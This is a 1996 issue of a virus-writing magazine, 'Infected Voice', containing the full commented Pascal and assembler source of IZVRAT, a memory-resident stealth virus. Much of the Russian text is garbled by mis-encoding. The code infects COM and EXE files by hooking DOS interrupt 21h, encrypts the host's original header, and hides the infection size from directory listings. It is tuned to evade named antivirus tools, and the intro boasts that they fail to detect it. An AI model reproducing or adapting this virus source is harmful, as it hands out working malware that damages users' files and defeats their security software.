{
      ��                  �
     ���  Virus Magazine  � Box 10, Kiev 148, Ukraine       IV  1996
     ��� ���������������� � ������������������� � ��������  ��������
      �� ��� ��� ��� ��� ��� ��� ���    � � ��� � ��� ���   � ���� �
       � � � ��  ��  �    �  ��  � �    � � � � � �   �     � ���� �
       � � � �   ��� ���  �  ��� ���     �� ��� � ��� ����  � ���� �
       � ����������������� �������������������������������  ��������
       (C) Copyright, 1994-96, by STEALTH group WorldWide, unLtd.


            �o�p� �e��, �e�ep, �o��, y�a�ae�� ��a�e��! � pa� �p��e�c�o�a��
 �e�� co c�pa��� o�epe��o�o "Infected Voice'a". He�a��o, ���e�� �� �a �ac�a�e,
 �e�c��e, Acce���epe ��� �o�c �po, ��a��oe, ��o �� ���epecye��c� �e�o� ��pyco�
 (��a�e �� �� ��o �e ��a� :). Bo� y�e a�pe�� �a ��ope, �a���o�� ��yc⨫ o�e-
 pe��o�o DrWEB'a (3.10), a �oc�o��� Kac�epc��� � �a�ec�e �ep�oa�pe��c�o� �y�-
 �� �c�a��� � c�o� AVP �e�o�c�pa�y ��pyca Tchechen ;). � �e�� �ce �opo�o, �ce
 �o c�apo�y, �o��o ���  �e����c�, �a  ��pyc� po��a��c�.  �a��o, �e �y�y  �e��
 �a�py�a�� c�oe� ���o� ������, �epe��e� �e�ocpe�c�e��o � ��pycy.

        IZVRAT - pe���e��� c�e�c ��pyc c ��e�e��a�� ��po�a���, �apa�a�騩
 *.COM *.EXE �a���. He o��apy���ae�c� DrWEB'o� �p� �apa�o��e �� � �a���, ��
 �a ��c�e. ����po�a���e �a��� �e �e�a�c� Adinf Cure Module, �oc�o��y ��-
 pye�c� �ac�� �apa�ae�o�o �a��a. Ca� AdInf �a  �apa�e���e �a���  �e  �p���,
 �a� �a� ��ec�e c ���e�e��e� ����� �o����pye�c� � �a�a �a��a. Ta�oe �a��a-
 ��e ��pyc �o�y稫 �o�o�y, ��o ��o � ec�� ca�� �ac�o�騩 ���pa�. M�e � �p�-
 po�e e�e �e �c�pe�a��c� pe���e���e c�e�c ��pyc�, �a��ca���e �a ��᪠��, ��
 � ����� �� १������� ����ᮢ, ����ᠭ�� �� ���, ��� � ��த� ����砫��
 ⮫쪮 Sentinel, �o � �o���e c��o���c� � ��e���, ��o o� �a��ca� �a C.  WEB,
 Aidstest � �po�e �a  �apa�e��e  �e  pea��py��,  �  ��o  �pa����o, �opo��e
 �o�ap�� (c) M.C. �op�a�e�. �a, co�c�e��o, �e �y�y ��o�o pac�poc�pa����c�,
 �e�� �epe� �o�o� �c�o����. B�epe�!

P.S.  B�pa�a� o�po��y� ��a�o�ap�oc�� Int O`Dream'y - �e� e�o y�ac�� ��o
      �po���e�e��e ���o��a �� �e y���e�o �o�����ep�o�o ��pa...
}


{$M 2048 , 0 , 0}   { 2K stack, no heap }
Uses Dos;
Const
     Buf   : Array [1..6] of Char = ('I','Z','V','R','A','T');
     { �� ����⠭�a �㦨� ��� ��।������ DS:DX ⥪�饩 �ண� }
     VirLen = 5555; { ����a �a��o�o�e��o�o ��pyca }
Var
  Regs        : Registers;
  Int21 , Old : Pointer; { 㪠��⥫� �� ����� }
  I , J       : Integer; { ��o ��� 横�o� }
  Sr          : SearchRec; { ��� �o�c�a �ep�� }
  Ext         : ExtStr; { pac�pe��e �a��a }
{
 type
     ������ Search, �ᯮ��㥬�� FindFirst
     � FindNext
   SearchRec = record
                 Fill: array[1..21] of Byte; - �ape�ep��po�a�o �OCo�
                 Attr: Byte;  - a�p��y�� �a��e�o�o �a��a
                 Time: Longint; - �a�a/�pe�� �a��e��o�o �a��a
                 Size: Longint; - pa��ep � �a��a� �a��e��o�o �a��a
                 Name: string[12]; - ��� � pac�pe��e �a��e��o�o �a��a
               end;
}
  EXEBuf      : Array[1..VirLen] of Char;{ �y�ep ��� �yc�a �apa�ae�o� �po�� }
  MyBuf       : Array[1..VirLen] of Char;{ c�a c���ae�c� �a�e �e�o }
  CopyLeft    : Array [1..17] of String;{ B ��o� �acc��e co�ep���c� �e�c� }
  IE        :  Array [1..2] of Char;{ ��o ��� �po�ep�� �e�a ��pyca }
  F         :  File; { ����� �a��a }
  Coder , Decoder : Byte; { ��� ��po��� / pac��po��� }
  CmdLine   : String; { ��� co�pa�e��� � �epe�a� op����a�y �apa�e�po� }
  OurName   : String; { c�a �a�o���ae� ��� � �y�� � �a�e� �po�pa��e }
  Attr      : Byte;   { a�p��y�� �a��a }
  Time      : LongInt; { �a�a/�pe�� }

 procedure CheckWriteProtect;       { �஢�ઠ, �� �⮨� �� �� ��᪥ }
 Label Shaise , Ob;
  begin                             { Write Protect }

   FindFirst(ParamStr(0) , AnyFile , Sr);
{
  �� ����⠭�� �ᯮ������� ��� �஢�ન, ��-
  ⠭���� � ���⪨ ��⮢ ��ਡ�� 䠩��� ��
  �ᯮ�짮����� ��楤�� GetFAttr, SetFAttr,
  FindFirst � FindNext:
  const
    ReadOnly  = $01;
    Hidden    = $02;
    SysFile   = $04;
    VolumeID  = $08;
    Directory = $10;
    Archive   = $20;
    AnyFile   = $3F;
}
   Assign(F , '\'+#$FF);     { Invisible file ! }
   ReWrite(F);      { co��ae� �a �e�y�e� ��c�e �a��, c�pae� e�o }
   Erase(F);

   If IOResult <> 0 Then GoTo Shaise; { ec�� ��a o訡�a, ��a��,
                                        ��c� ReadOnly - jmp Shaise }

   Assign(F , Copy(OurName, 1 , Length(OurName) - Length(Sr.Name)) + #$FF);

   ReWrite(F);    { co��ae� � c�pae� �a�� �a ��c�e, c �o�opo�o �ac �a�yc- }
   Erase(F);      { ⨫� }

   If IOResult <> 0 Then GoTo Shaise; {  ec�� ��a o訡�a, ��a��, ��c�
                                         ReadOnly - jmp Shaise }
   GoTo Ob;                           { �epe�o� � �o�e� �po�e�yp� }

Shaise:
   WriteLn(CopyLeft[7]);        { B�o� coo��e��� Abnormal program ter- }
   Halt(8);                     { mination � ���o� � �OC }
Ob:
 end;   { �o�e� �po�e�yp� }

function CheckTSR : Boolean;    { �y���� �po�ep�� �a �a���e � �a���, }
  begin                         { �o��pa�ae� True, ec�� � �a��� �a�o���- }
    Regs.AX:=$BA69;             { c� a�⨢�a� �o��� ��pyca }
    Intr($21 , Regs);
    CheckTSR:=False;
    If Regs.AX=$69BA then CheckTSR:=True;
  end;



                          { �po�e�ypa �apa�e��� �� pe���e��a }
procedure my21h(az:word); { ��뢠���� � ��ࠬ��஬ AX }
var
    Inf  : Byte;          { c�e�稪 ����po�a���� }
    DT   : DateTime;      { ��� ���e�e��� �a��/�pe�e�� }
{
  type
      Date & time ������, �ᯮ��㥬��
      PackTime � UnpackTime
    DateTime = record
                 Year , Month , Day,
                 Hour,Min,Sec: Word;
}
label Q1,AI,On;        { ��⪠ ��� ���o�a Q1 }
         { �e�a AI (Already Infected) ��� �o�o, ��o�� cpa�y �a FindNext }
begin
          asm
             XOR AX,AX             { ��� pa�o�� �ac�a�e�c��� o�epa�opo� �� }
             MOV DS,AX             { pe���e��a �occ�a�a����ae� DS:DX, co�- }
             LDS DX,DS:[0E4h*4]    { pa�e��� � �e��ope E4h }
          end; { �o�e� acce���epa }
     Inf:=0; { c�e�稪 ����po�a���� � 0 }

     If Hi(Az) <> $5B Then
      If Hi(Az) <> $41 Then GoTo Q1;

     { �apa�e��e �po�c�o���, ec�� �맢a�� �y��樨 int 21h 5Bh (co��a�� }
     { �o�� �a��), ��o� �-�e� �o��y��c� Bo��o�/Hop�o� �p� �o��po�a��� }
     { ��� 41h (y�a���� �a��). ��a�e y�pa��e��e o�ae�c� �a op����a��� }
     { 21h. �a o��� ��o� ��� �y��権 ����pye�c� 1 EXE ��� COM �a�� }
     { � �e�y�e� �a�a�o�e }

     asm
       PUSH AX          { co�pa��e� AX }
       IN AL,21h        { �a �pe�� pa�o�� ��pa ��py�ae� }
       OR AL,3          { ��a�y }
       OUT 21h,AL
       POP AX           { �occ�a�a����ae� AX }
     end;               { �o�e� acce���epa }

     FindFirst(CopyLeft[9] , AnyFile , Sr);
    { � �e�y�e� �a�a�o�e ��e� *.* c ��묨 a��p��y�a�� }
    { Bce �e�c�o��e c�po�� ⨯a *.*, .EXE � �.�. �a�o���c� � �acc��e }
    { CopyLeft � � �e�e ��pyca �a ��c�e ��po�a�� XOR'o� �o 47h }

      While DosError = 0 Do { �o�a �e �a�o��a��c� �a��� � �e�y�e� �a�a�o�e }
       begin
           Ext:=Copy(Sr.Name , Length(Sr.Name) - 3 , Length(Sr.Name));
          { �o�y�ae� pac�pe��e �a��e��o�o �a��a }

           If Ext <> CopyLeft[8] Then
                                           { �᫨ .EXE ��� .COM -- ⮣�� }
           If Ext <> CopyLeft[15] Then GoTo Ai;
                                           { ��稭��� ����� ��ࠦ���� }
            If Sr.Attr = Directory Then GoTo Ai;
     { Hy ��o �po�ep�a �a �o, ��o�� �a�� ?.EXE ��� ?.COM �e o�a�a�c� }
     { �a�a�o�o�. Kc�a�, o� y �e�� ��e��o �a ��o� c�a�a�a � c�e�a� ;) }

            Time:=Sr.Time;       { �o�y�ae� �pe�� �a��e��o�o �a��a }
            UnPackTime(Time , DT); { pac�a�o��ae� �a��c� �pe�e�� }
{
  procedure UnpackTime(Time : Longint;
                       var T : DateTime);

  �८�ࠧ�� 4-���⮢��, 㯠�������� � Longint
  �६� � ����, �����頥��� GetFTime,
  FindFirst ��� FindNext � �ᯠ�������� ������
  ⨯� DateTime.
}
            If ((Dt.Month = 5) And (Dt.Day = 21)) Then GoTo Ai;
        { Ec�� �a�a 05/21/ - ��a�� y�e �apa�e� - �epe�o� �a FindNext }

            If Sr.Name = CopyLeft[10] Then GoTo Ai;
            If Sr.Name = CopyLeft[11] Then GoTo Ai;
            If Sr.Name = CopyLeft[12] Then GoTo Ai;
            If Sr.Name = CopyLeft[13] Then GoTo Ai;
            If Sr.Name = CopyLeft[16] Then GoTo Ai;
            If Sr.Name = CopyLeft[17] Then GoTo Ai;
 { C��co� �po�, �o�op�e �apa�a�� �e �a�o (��� co��ec⨬oc� c pa��묨 }
 { �pa��epa�� � �op�a�e EXE ��� COM �a��o�, �a�p��ep, EMM386.EXE ��� }
 { STACKER.COM. Kc�a�, � ��o� c��co� �� �p��樯a �e �o�e� WIN.COM. :EEEE }

            If Sr.Size < 10240 Then GoTo Ai;
         { Ta��e �e �apa�ae� �a��� ����o� �e���e 10k }
            If ((Ext = CopyLeft[15]) And (Sr.Size > 64000 - VirLen)) Then GoTo Ai;
   { �஢���e�, ��o�� ����a .COM 䠩�� ��a �e �o���e 64000 - ����a ��pyca }
            If Sr.Attr <> $20 Then GoTo Ai;
        { �஢�ઠ �� ��ਡ���: �᫨ �� Archive, ��� �� ���室�� }

            Attr:=Sr.Attr;          { �a�o���ae� ��ਡ��� 䠩�� }

            Assign(F , Sr.Name);    { C���ae� ����� c �a��e��� �a��o� }
            SetFAttr(F , Archive);  { ��⠭�������� a�p��y� Archive }
            Reset(F , 1);           { o�p�ae� e�o �a �a��c� }
            If IOResult <> 0 Then GoTo Ai; { ec�� �e �o�y稫oc� o�p���, }
   { �epe�o��� �a FindNext, � �⨬ �o��o�a�c� ��� o�a��� �o� AVPTSR'o� }

            BlockRead(F , EXEBuf , VirLen); { c���ae� �a�a�o �po�� }

            Coder:=0;                       { o��y��e� �a�� ��po�騪a, }

            MyBuf[160]:=Chr(Coder); { �a�o���ae� ��o� �a�� � �y�epe, }
                                    { co�ep�a�e� �e�o ��pyca }

            Seek(F , 0);                    { yc�a�a����ae� y�a�a�e�� �a
                                              �ep�y� �o���� � �a��e }
            BlockWrite(F , MyBuf, VirLen);  { ���c�ae� � �a�a�o �e�o ��pa }
            Seek(F , Sr.Size);              { a �e�ep� y�a�a�e�� �a �o�e�
                                              �a��a }
            BlockWrite(F , EXEBuf , VirLen); { ���c�ae� co�pa�e��oe �a�a�o }

            SetFAttr(F , Attr);     { ����⠭�������� a�p��y�� }

            Dt.Month:=5;            { �c�a�a����ae� �a�y �a 05/21/ }
            Dt.Day:=21;
            PackTime(DT , Time);    { �a�ye� �a�y/�pe�� �a��a }
{
  procedure PackTime(var T : DateTime;
                     var Time : Longint);

  �८�ࠧ��  ������ ⨯� DateTime �
  4-� ������ 㯠�������� ����-�-�६� ⨯�
  Longint, �ᯮ��㥬�� SetFTime.
}
            Reset(F);               { e�e pa� o�p�ae� �a��, ��a�e }
                                    { Close ���e��� �a�y/�pe�� }
            SetFTime(F , Time);     { �c�a�a����ae� �a�y/�pe�� }
            Close(F);               { �a�p�ae� �a�� }
            Inc(Inf);      { y�e��稢ae� �a 1 c�e�稪 �apa�e���� }

            If Inf>=1 Then GoTo On;
            { ec�� �apa���� �a cea�c 1 �a�� - �o��pa� y�pa��e��� � OC }
Ai:
            FindNext(Sr);    { Ocy�ec⢫�e� �o��op�� �o�c� �o �ac�e }
       end;    { �o�e� 横�a While }
On:
       asm
         PUSH AX      { co�pa��e� AX }
         IN   AL,21h  { �����ae� ��a�y o�pa�o }
         AND  AL,$FC
         OUT  21h,AL
         POP  AX      { �occ�a�a����ae� AX }
       end; { �o�e� acce���epa }
Q1:     { �e�a �o��a �po�e�yp� }

end;    { �o�e� �po�e�yp� }


                      { Ha� o�pa�o�稪 int 21h }
 procedure New21h; Assembler;
  label NEXT,STE,END_STE,END_C,_EXEC,FINAL,FUCK,NON,STEALTH,ASD,QWE;
         { ��o �y�a �e�o� ��� �epe�e�e��� �o o�pa�o�稪y :) }
   asm
      PUSHF               { Co�pa��e� �a�� }
      CMP AX,0BA69h       { ��o ��� �po�ep�� �a���� ��pyca � �a��� }
      JNZ NEXT            { ec�� AX �e pa�e� BA69h, �o ��o �e �� }
      MOV AX,69BAh        { �o��pa�ae� 69BAh }
      POPF                { �occ�a�a����ae� �a�� }
      RETF 2
Next:
      CMP AH, 4Ch         { ec�� �맢a�a �-�� 4Ch (�a�ep�e��e �po�ecca), }
      JZ  FINAL           { �����ae� c�e�c-�e�a���� }
      CMP AX, 0ADDFh      { ec�� � AX �a�o���c� ADDFh, �o�e �����ae� c�e�c, }
      JZ  FINAL           { ��o c�e�a�o ��� co��ec⨬oc� c �epe���e��o� }
                          { �ac��� ��pyca }
      CMP WORD PTR [CS:STEALTH],1
      JNZ ASD
      POPF
      INT 0E3h            { �o� ��o ��o� op����a��o�o int 21h, co�pa�e�- }
         { �o�o � int E3h }
      RETF 2
ASD:
      CMP AH, 4Bh        { ec�� �맢a�a �-�� 4Bh (�a�py���� � ��o�����), }
      JZ  _EXEC          { �po�ep�e�, �a�a� ��e��o �po�pa��a �a�py�ae�c� }
      CMP AX, 0FDDAh     { Ec�� � AX FDDAh, �o �몫��ae� c�e�c-�e�a����, }
      JNZ QWE            { o����-�a�� ��� co��ec⨬oc� c �epe���e��o� }
     { �ac��� ��pyca, ��a�e �e�e� �a���e �o o�pa�o�稪y }
      POPF               { ��� �y� � �o� :) _��ec�_ �o��o ��o �� � �e }
      PUSH ES            { �e�a��, �o �p� �a��e��e� pa�o�e ��o �ce �occ- }
      PUSH DS            { �a�a����ae�c�, �o��o�y �p��o���c� co�pa���� :( }
      DB   60h           { �ac�a�� �e �y�ae� ��c�py�樨 PUSHA � POPA, }
    { �o��o�y �p��o���c� ��ec�o PUSHA ��ca�� 60h, a ��ec�o POPA - 61h }
      PUSHF
      JMP NON            { �epe�o� �a o⪫��e��e c�e�c-�e�a����a }
QWE:
      CMP AH, 4Eh        { ec�� �맢a�� �-樨 4Eh (FindFirst) ��� 4Fh }
      JZ STE             { (FindNext), �o �epe�o��� �a c�e�c-o�pa�o�稪 }
      CMP AH, 4Fh
      JZ STE
      POPF               { �occ�a�a����ae� �a�� }
      PUSH ES     { ��࠭�� ES }
      PUSH DS     { DS }
      DB 60h      { � �� ��⠫�� ॣ����� � �⥪� }
      PUSHF       { � �� 䫠�� }
      PUSH AX     { ���� ��ࠬ��� - AX }
      CALL MY21h  { �맮��� �a�y ��楤��� ��ࠡ�⪨ }
FUCK:
      POPF                { ����⠭���� 䫠�� }
      DB 61h              { �occ�a�o��� �� ॣ����� }
      POP DS              { DS }
      POP ES              { � ES }
      INT 0E3h            { �맮��� ���� int 21h }
      RETF 2

STE:                      { �o� ��ec� �a稭ae�c� c�e�c-o�pa�o�稪 }
      POPF
      INT 0E3h            { ��� �o�y�e��� ���o ���ae� int 21h }
      JC END_C            { �p� yc�a�o��e��o� Carry Flag (� c�y�ae }
     { o訡�� ���o��� }

      PUSHF               { co�pa��e� �a�� }
      PUSH DS             { DS � ES }
      PUSH ES
      DB  60h             { � �ce oc�a���e pe��c�p� }
      MOV AH,2Fh          { ���ae� op����a��� int 21h ��� �o�y�e��� }
      INT 0E3h            { �e�y�e�o ��a�e��� Data Tranfer Area (DTA) }
      MOV AX, WORD PTR ES:[BX+18h]
     { �o�y�ae� �a�y �a��a � AX }
      MOV DX, AX    { �o��pye� AX � DX ��� �oc�e�y��e�o �c�o��o�a��� }
      AND AL, 1Fh
      CMP AL, 21    { cpa����ae� �e��, ec�� �e 21, �o �a� �e �y�e� }
      JNZ END_STE
      AND DL, 0A0h  { �o� ��� �e�o �� AX � DX �y���� }
      CMP DL, 160   { 5 ��-祫����᪨ AKA 10100000 AKA A0, �.e. cpa����ae� }
      JNZ END_STE   { �ec��, ec�� �e 5, �o o����-�a�� �e �� }
      SUB WORD PTR ES:[BX+1Ah],VirLen
   { a ec�� � �e�� co��a�, � �ec�� �po�e �a�, �o o⭨�ae� o� pea��o� ����� }
   { ����y ��pyca }

END_STE:       { a ��o, co�c�e��o, �o�e� c�e��-o�pa�o�稪a }
      DB 61h   { ��ec� �ce �occ�a�a����ae�c� �ec� �aoc � pe��c�pa� }
      POP ES
      POP DS
      POPF
END_C:
      RETF 2
_EXEC:         { a ��o �ac��, o�e�a��a� �a �po�ep�y ��e� �a�py�a���c� }
               { �po�pa�� }
      POPF
      PUSH ES  { �ce, �oc�e���� pa� ���y �po �o, ��o � ��o-�o co�pa��� }
      PUSH DS  { ��� �occ�a�a����a�, �oc�a�o y�e }
      DB 60h
      PUSHF
      PUSH DS
      POP ES
      PUSH DX
      POP DI
      MOV CX, 40h { �a�c��a��a� ����a c�a��pye�o�o ��e�� - ��o �o���e? ;) }
      MOV AL, '.' { ��e� �o�y � c�po�e }
      CLD
      REPNE SCASB
      JNE FUCK    { ec�� �e� �o窨, �o �y e�o �a䨣 }
      SUB DI, 3

      CMP WORD PTR [ES:DI],'BE'  { drwEB ����� }
      JZ NON                     { ec�� o�, �o �몫��ae� c�e�c-�e�a���� }
      CMP WORD PTR [ES:DI],'FN'  { adiNF }
      JZ NON
      CMP WORD PTR [ES:DI],'TS'  { aidsteST �o�o��� }
      JZ NON
      CMP WORD PTR [ES:DI],'NA'  { scAN }
      JZ NON

     { �a���e ��e� �y�a ap娢a�opo�, ��� �o�op�� �o�e �eo��o���o o⪫��a�� }
     { c�e�c, ��a�e �apa�e��� �a�� �p� ap娢a樨 �e��a�e��o �c�op��c� }

      CMP WORD PTR [ES:DI],'RA'    { rAR }
      JZ NON
      CMP WORD PTR [ES:DI],'JR'    { aRJ }
      JZ NON
      CMP WORD PTR [ES:DI],'AH'    { HA }
      JZ NON
      CMP WORD PTR [ES:DI],'PI'    { zIP }
      JZ NON
      CMP WORD PTR [ES:DI],'KA'    { pAK }
      JZ NON
      JMP FUCK    { �y �o� � �ce, ��� oc�a���� c�e�c-�e�a���� a�⨢e� }

     { B몫��e��e c�e�c-�e�a����a }
Non:
      MOV WORD PTR [CS:STEALTH],1
     { �몫��ae� �o �poc�o�y �p��樯y: � ��e��y �a��� �a�o��e� 1 ��� 0: }
     { 1 - c�e�c �몫��e�, 0 - c�e�c a�⨢e� }
      JMP FUCK
Stealth:
      DW 0    { �o� ��e��o ��ec� ��a ��e��a � �a�o���c� }

     { A ��ec� �� �ao�opo� c�e�c �����ae� }
Final:
      POPF
      MOV WORD PTR [CS:STEALTH],0
      INT 0E3h
      RETF 2

      { �ac�a��c��, �o�pa�y��ec�!!! Acce���ep �a�o�稫c�... ;) }
      { �a�o�稫c� o�pa�o�稪 int 21h - �a���e �o��e� o��� �ac�a�� }

end;       { �o�e� �po�e�yp� }

 procedure ExecOriginal;     { ��楤�� �ᯮ������ ��ࠦ����� �ணࠬ�� }
  begin

    asm
        MOV AX, 0FDDAh       { ��� �o�o, ��o�� �o�y��� pea��� pa��ep }
        INT 21h              { �po�pa���, �pe�e��o o⪫��ae� Stealth }
    end;

    FindFirst(ParamStr(0) , AnyFile , Sr); { �o�y�ae� �c� ���op�a�� o
                                             �po�pa��e, �� �o�opo� �a�yc-
                                             ⨫�c� }

    Assign(F , ParamStr(0));           { c���ae� ����� c �e� }

    Time:=Sr.Time;          { ���������� ����/�६� � ��ਡ��� 䠩�� }
    Attr:=Sr.Attr;

    SetFAttr(F , Archive);    { ��⠭�������� ���ਡ�� Archive }

    Reset(F , 1);             { o�p�a� �a �a��c� }

    Seek(F , Sr.Size - VirLen); { �epe�e�ae� y�a�a�e�� �a �o����
                                  ����a_�a��a - ����a_B�pyca }

    BlockRead(F , EXEbuf , VirLen);   { C���ae� op����a��oe �a�a�o }

    Seek(F , Sr.Size - VirLen);       { o���� y�a�a�e�� �a
                                        ����a_�a��a - ����a_B�pyca }
    Truncate(F);                      { o�pe�ae� �a��, �occ�a�a����a�
                                        e�o op����a��y� ����y }

    For I:=1 To VirLen Do             { pac��po��ae� c��a��oe �a�a�o }
      EXEBuf[I]:=Chr(Ord(EXEBuf[I]) Xor Decoder);

    Seek(F , 0);                      { �epe�e�ae� y�a�a�e�� �a 1 �o���� }
    BlockWrite(F , EXEBuf , VirLen);  { �a��c�ae� �a�a�o }

    SetFTime(F , Time);               { yc�a�a����ae� op����a���e }
    SetFAttr(F , Attr);               { �a�y/�pe�� � a�p��y�� �a��a }

    Close(F);                         { �a�p�ae� e�o }

    SwapVectors;
      Exec(GetEnv(CopyLeft[14]) , '/C '+OurName+' '+CmdLine);  { �ᯮ��塞 }
    SwapVectors;
    If DosError <> 0 Then       { ec�� �c�o����� �e y�a�oc�, ��o��� }
         WriteLn(CopyLeft[7]);  { "Abnormal program termination" }

    Assign(F , ParamStr(0));    { O���� c���ae�c� c �oc��e�e� }
    SetFAttr(F , Archive);      { �c�a�a����ae� a�p��y� Archive }

    Reset(F , 1);               { o�p�ae� �a �a��c� }

    Randomize;
{
  procedure Randomize;
  ���樠������� ���஥��� ������� ��-
  砩��� �ᥫ.
}

    Coder:=Random(255);         { B롨pae� c�y�a��oe �c�o � pa�o�e 0..255 }

    For I:=1 To VirLen Do       { ��pye� �a�a�o op����a��o� �po�pa��� }
       EXEBuf[I]:=Chr(Ord(EXEBuf[I]) Xor Coder);


  { A 横� ���e �c�a��e� co�ce� �a�apy, ��� �o�o, ��o�� �o�, ��o �y�e� }
 { �c�a�� � �e�e ��pyca �a�� pac��po�騪a, c�e��a �o�y�a�c�, �a� �a� }
{ ��ec�o o��o�o �a��a ��po�騪a � �e�e ��pyca �oc�oﭭo ���e��e�c� 20 �a�� }
    Randomize;
    For I:=147 To 163 Do
       begin
         MyBuf[I]:=Chr(Random(255));
       end;

    MyBuf[160]:=Chr(Coder);  { �a�o���ae� �a�� ��po�騪a � �e�e ��pyca }

    BlockWrite(F , MyBuf , VirLen); { �a��c�ae� � �a�a�o �e�o ��pyca }

    Seek(F , Sr.Size - VirLen);     { �epe�e�ae� y�a�a�e�� �a �o�e� �a��a }

    BlockWrite(F , EXEBuf,VirLen); { �a��c�ae� � �o�e� op����a��oe �a�a�o }

    SetFTime(F , Time);         { ����⠭�������� ����/�६� � }
    SetFAttr(F , Attr);         { ��ਡ��� 䠩�� }

    Close(F);                   { �a�p�ae� �a�� }


     { O���� �����ae� c�e�c-�e�a���� }
    asm
        MOV AX, 0ADDFh
        INT 21h
    end;

 end;   { �o�e� �po�e�yp� }

procedure Init;      { �po�e�ypa ����a���a樨 ��pyca }
 begin

    { ��o �acc�� co �c直�� �o�e��묨 � �poc�o �e�c�o�묨 c�po�a��, }
    { �o�op� �pa�� y����� �o��o � �a���, �a� �a� �a ��c�e o� ��po�a� }

  CopyLeft[1]:='Izvrat v3.1beta (cl) Dirty Nazi';
  CopyLeft[2]:='Stealth Group World Wide';
  CopyLeft[3]:='Thanks Int O`Dream & Borland';
  CopyLeft[4]:='Happy birthday, Dirty Nazi!';
  CopyLeft[5]:='� �a��o�o �� �ac ���� �o�y� pa���e �o��, �o �e�� y �ac e���a...';
  CopyLeft[6]:='Ko��a � y�ep, �e ��o ���o�o, ��o �� ��o o�po�ep�... AidsTest. :)';
  CopyLeft[7]:='Abnormal program termination';
  CopyLeft[8]:='.EXE';
  CopyLeft[9]:='*.*';
  CopyLeft[10]:='NCMAIN.EXE';
  CopyLeft[11]:='EMM386.EXE';
  CopyLeft[12]:='QEMM.EXE';
  CopyLeft[13]:='SETVER.EXE';
  CopyLeft[14]:='COMSPEC';
  CopyLeft[15]:='.COM';
  CopyLeft[16]:='COMMAND.COM';
  CopyLeft[17]:='STACKER.COM';

   { �oc�e �o�����樨 �a�e��� � �o�y稢訩c� EXE譨� HIEW'o� � �oXOR��� �ec�
     �acc�� �o 47h, a �o�o� e�o o��a�e��o �a�p��� PKLITE -E }

   For I:=1 To 17 Do  { Pac�cop��ae� �ecca�� � �e�e }
    begin
      For J:=1 To Length(CopyLeft[I]) Do
        begin
          CopyLeft[I,J]:=Chr(Ord(CopyLeft[I,J]) Xor $47);
        end;
    end;

     OurName:=ParamStr(0); { �a�o���ae� ��� ����饭��� �ணࠬ�� }

     CheckWriteProtect;           { �஢��塞, �� �� Read Only �� ��᪥ }
                                  { ��� �⥫� �������� }
     CmdLine:='';         { O��y��e� �epe�e��y� �o�a���o� c�po�� }

     Assign(F , ParamStr(0));  { o�p�ae� �a� �oc��e�� �a ��e��e }
     Reset(F , 1);

     BlockRead(F , MyBuf , VirLen);   { ���뢠�� � ���� ⥫� ����� }

     Close(F);                  { � �a�p�ae� e�o }

     Decoder:=Ord(MyBuf[160]);  { �a�o���ae� �e�y騩 �a�� ��po�騪a }

     IF ParamCount <> 0 Then    { ec�� � �o��a���o� c�po�e ec�� �apa�e�p� }
        Begin
           For I:=1 To ParamCount Do
             CmdLine:=CmdLine + ' ' + ParamStr(I); { ���뢠�� ��ࠬ���� }
        End;                                       { � �epe�e��y� CmdLine }

 end; { �o�e� �po�e�yp� }

 procedure Hide; Assembler;    { �po�e�ypa c�p�a��� ��pyca � �a��� }
   asm
     PUSH ES
     PUSH AX
     MOV AX,0000
     DEC AX
     MOV ES,AX
     MOV WORD PTR ES:[1],70h  { �oc�e ��o�o Bo��o� � y⨫��� �po�e AVPTSR }
     POP AX                   { �y�a��, ��o oc�o��oe �e�o ��pyca � �a��� - }
     POP ES                   { o�py�e��e �OCa � �e �o�a��a�� e�o }
     DB 0EAh                  { �pa��a, AVPTSR � �a��� ����� ��� �po�pa���, }
     DW 0                     { c �o�opo� ��p ��c�a���po�a�c� � �a����, }
     DW 0                     { �o ����a ee o�o�o �o����o�a��a �ce�o :) }
   end;

begin   { * MAIN * }          { A �o� co�c�e��o � �o�� �o�e� �po�pa��� - }
                              { �a稭ae�c� oc�o��o� �o�y�� }

  Init;          { ����a���a�� }
  ExecOriginal;  { �a�yc� �a �c�o��e��e �oc��e�� }
  SwapVectors;   { o�ae� �OCy �ce �a�a�e���e �ac�a�e� �e��op�, ⨯a 0h }
{
  procedure SwapVectors;
  ����⠢��� SaveIntXX 㪠��⥫� � ⥪�騬
  ����஬.
}
  If Not CheckTSR Then    { Ec�� �ac �e� � �a��� }
    begin

       GetIntVec($21,Old);  { ������� ���� int 21h }
       SetIntVec($E3,Old);  { �epe�ec��� int 21h �� E3h }
       SetIntVec($21,Addr(New21h)); { ��⠭����� ��� ��ࠡ��稪 �� int 21h }
       SetIntVec($E4,Addr(Buf));   { co�pa���� � Int E4h �� ᠬ� DS:DX }

       Regs.AH:=$62;                { �o�y�ae� a�pec �pe䨪ca �po�pa���o�o }
       Intr($21 , Regs);            { ce��e��a (PSP) }


   { ����� ���pa�o� ��c�a���pye� �po�e�ypy Hide � �a����, �oc�e ��o��e��� }
   { c�a��ap�o� �y��樨 �ac�a�� Keep y�pa��e��e �o�y�� �po�e�ypa Hide }

       MemW[Seg(Hide):Ofs(Hide)+3]:=Regs.BX;
       MemW[Seg(Hide):Ofs(Hide)+18]:=MemW[Regs.BX:$A];
       MemW[Seg(Hide):Ofs(Hide)+20]:=MemW[Regs.BX:$C];
       MemW[Regs.BX:$A]:=Ofs(Hide);
       MemW[Regs.BX:$C]:=Seg(Hide);

       Keep(0); { Terminate, stay resident }
     { �oc�e ��o� �o��a��� �o�e�e �pe�e�a�� - ��pyc � �a���!!! :) }

{
  procedure Keep(ExitCode : Word);
  Keep (��� Terminate Stay Resident -
  ��� � ������� १����⮬ )
  �४�頥� �ணࠬ��, ��⠢��� �� �
  �����.
}
 end;
end.   { * Bce, �o���e ���a��� �o��e��ap�e� * }
